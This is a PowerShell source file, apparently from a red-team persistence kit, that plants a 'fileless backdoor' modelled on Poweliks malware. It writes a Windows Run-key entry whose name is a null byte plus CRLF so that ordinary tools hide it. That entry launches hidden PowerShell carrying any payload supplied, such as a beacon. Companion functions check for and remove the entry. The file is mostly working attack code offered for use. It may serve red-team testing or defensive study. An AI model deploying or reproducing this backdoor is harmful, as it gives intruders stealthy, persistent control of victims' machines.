function Add-PersistNullRegkey{
    <#
    .SYNOPSIS
    This script adds a "fileless backdoor" in a similar manner seen by the Poweliks malware. 
    Author: Jonathan Echavarria (@Und3rf10w)
    Adapted By: Altoid0, Twitter: @Altoid0day
    .DESCRIPTION
    Original script: https://github.com/Und3rf10w/Aggressor-scripts/blob/master/kits/PersistKit/scripts/Persist-Poweliks.ps1
    This function creates a registry key with the name of "<nullbyte><CRLF>", that contains an entry named "<nullbyte><CRLF>"
    that executes the stored payload.
    For more information, see: https://isc.sans.edu/forums/diary/20823
    .EXAMPLE
    PS C:\> Add-PersistNullRegkey -Payload <web drive-by/ps beacon/ps command>
    .NOTES
    Remove the "powershell.exe" at the start as it is already added by the script
    #>
    
        [CmdletBinding()]
            Param(
            [Parameter(Mandatory)]
            [string]$Payload
        )
        [Byte[]]$malformed_ary = 0x00,0x0a,0x0d #`0`r`n
        $malformed_string = [System.text.encoding]::Unicode.GetString($malformed_ary)
        
        # Double powershell method (will have 2 instances of powershell running)
        # New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $malformed_string -PropertyType String -value "$powershell_path -windowstyle hidden -c `"`$val = (gp HKLM:SOFTWARE\`'$malformed_string`').`'$malformed_string`'; $powershell_path -windowstyle hidden -ec `$val`""
        
        # Streamlined single instance powershell method
        New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $malformed_string -PropertyType String -value "powershell.exe -windowstyle hidden -c {$Payload}"
} 
    
    
function Test-PersistNullRegkey{
    <#
    .DESCRIPTION
    This function checks for the presence of a backdoor that would have been added by the Persist-Poweliks function
    #>
    
        [Byte[]]$malformed_ary = 0x00,0x0a,0x0d #`0`r`n
        $malformed_string = [System.text.encoding]::Unicode.GetString($malformed_ary)
    
        <#
        if (Test-Path "HKLM:\SOFTWARE\$malformed_string") {
            Write-Output "[*] Backdoor exists"
        } else {
            Write-Output "[!] No backdoor present"
        }
        #>
        if (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run "$malformed_string") {
            Write-Output "[*] Launcher exists"
        } else {
            Write-Output "[!] No launcher present"
        }
}
    
function Remove-PersistNullRegkey{
    <#
    .DESCRIPTION
    This function removes a backdoor added by the Persist-Poweliks function
    #>
        [Byte[]]$malformed_ary = 0x00,0x0a,0x0d #`0`r`n
        $malformed_string = [System.text.encoding]::Unicode.GetString($malformed_ary)
        <#
        if (Test-Path "HKLM:\SOFTWARE\$malformed_string") {
            Remove-Item -Path "HKLM:\SOFTWARE\$malformed_string"
            Write-Output "[*] Backdoor Removed"
        } else {
            Write-Output "[!] Error Removing Backdoor (already removed?)"
        }
        #>

        if (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run "$malformed_string") {
            Remove-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name "$malformed_string"
            Write-Output "[*] Launcher Removed"
        } else {
            Write-Output "[!] Error Remove Launcher (already removed?)"
        }
}